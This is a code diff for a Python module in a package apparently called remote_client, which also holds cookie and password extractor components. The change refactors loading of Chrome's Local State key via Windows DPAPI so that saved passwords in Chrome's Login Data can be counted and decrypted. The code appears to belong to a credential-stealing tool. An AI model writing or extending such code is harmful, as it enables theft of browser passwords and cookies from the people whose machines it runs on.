@@ -2,18 +2,17 @@
 from __future__ import annotations
 
 import base64
-import hashlib
 import json
 import os
 import shutil
 import sqlite3
 import tempfile
-import uuid
 from pathlib import Path
 from typing import Any
 
 from remote_client.cookie_extractor import ABE_AVAILABLE
 from remote_client.cookie_extractor.browsers import BROWSER_CONFIG, resolve_path
+from remote_client.cookie_extractor.decrypt import get_dpapi, load_local_state_key
 
 
 def _load_chrome_local_state() -> Path | None:
@@ -45,6 +44,21 @@ def _get_chrome_profile_path(profile: str = "Default") -> Path | None:
     return None
 
 
+def _load_password_decryption_key(local_state: Path | None) -> bytes | None:
+    if not local_state or not local_state.exists():
+        return None
+    dpapi = None
+    if os.name == "nt":
+        try:
+            dpapi = get_dpapi()
+        except Exception:
+            dpapi = None
+    try:
+        return load_local_state_key(local_state, dpapi, "chrome")
+    except Exception:
+        return None
+
+
 def _count_passwords() -> dict[str, Any]:
     """Count and optionally decrypt saved passwords in Chrome Login Data."""
     result = {
@@ -68,15 +82,10 @@ def _count_passwords() -> dict[str, Any]:
         return result
     
     # Try to get decryption key
-    decryption_key = None
-    try:
-        from remote_client.password_extractor.extractor import _load_encryption_key
-        local_state = _get_chrome_user_data_dir() / "Local State" if _get_chrome_user_data_dir() else None
-        if local_state and local_state.exists():
-            decryption_key = _load_encryption_key(local_state)
-            result["decryption_available"] = decryption_key is not None
-    except ImportError:
-        pass
+    user_data_dir = _get_chrome_user_data_dir()
+    local_state = user_data_dir / "Local State" if user_data_dir else None
+    decryption_key = _load_password_decryption_key(local_state)
+    result["decryption_available"] = decryption_key is not None
     
     conn = None
     try:
@@ -445,7 +454,6 @@ def _read_chrome_version_from_registry() -> str | None:
                         try:
                             value, _ = winreg.QueryValueEx(key, value_name)
                             if isinstance(value, str) and value.strip():
-                                winreg.CloseKey(key)
                                 return value.strip()
                         except FileNotFoundError:
                             continue
